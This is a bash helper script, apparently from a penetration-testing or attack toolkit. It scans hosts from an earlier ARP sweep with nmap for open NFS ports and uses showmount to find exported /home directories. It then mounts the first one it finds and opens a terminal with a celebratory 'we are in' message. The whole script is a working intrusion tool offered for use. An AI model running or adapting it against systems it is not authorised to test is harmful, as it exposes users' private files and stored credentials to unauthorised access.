printf "[${BRIGHT}${BLUE}NFS Scan${NORMAL}]:"

#helper script for NFS connection
NFS_PORT=2049

printf " running ${MAGENTA}nmap${NORMAL} on port: ${MAGENTA}$NFS_PORT${NORMAL}\n  over hosts: ${YELLOW}$ARPRESULT${NORMAL}\n..."
SECONDS=0
# sample nmap scan using arp-scan result 
NFSABLE=$(nmap -Pn -p$NFS_PORT $ARPRESULT --open | grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' | tr '\n' ' ')
printf "...scan complete in ${GREEN}$SECONDS seconds!${NORMAL}\n\n"

if [[ -z NFSABLE ]]; then
    printf "No NFS targets found! That's probably not good\n"
else
    NFS_HOSTS=($NFSABLE)
    NFS_TARGETS=()
    for nfs_host in "${NFS_HOSTS[@]}"
    do
        HOME_MOUNTED="$(showmount -e $nfs_host 2>&1 | grep home)"
        if [[ -z $HOME_MOUNTED ]]; then
            printf "${BLUE} ${EM_CRYFACE}  ${RED}No home directory shared on${YELLOW} $nfs_host${NORMAL}.\n\n"
        else
            printf "${GREEN} $EM_EEEVIL${NORMAL}  Oho! Home directory shared on ${YELLOW}$nfs_host${NORMAL}!\n\n"
            NFS_TARGETS+=($nfs_host)
        fi
    done
fi

is_empty "$NFS_TARGETS" "NFS home directory scan failure!"

printf "   ...mounting ${YELLOW}${NFS_TARGETS[0]}${NORMAL}...\n"

mkdir /tmp/automount > /dev/null 2>&1
mount -t nfs ${NFS_TARGETS[0]}:/home/ /tmp/automount
printf "\nLaunching new terminal for ${YELLOW}${NFS_TARGETS[0]}:${GREEN}/home/${NORMAL}\n"


NEW_BASH_CMD="cd /tmp/automount;clear;printf '\n  ${CYAN}$EM_AWWYISS${NORMAL}  Hooray, we are in!\n\t${BRIGHT}/home directory contents:${NORMAL}\n=============[USER|GROUP]=================\n';ls -la"
gnome-terminal -e "bash -c \"$NEW_BASH_CMD; exec bash\""
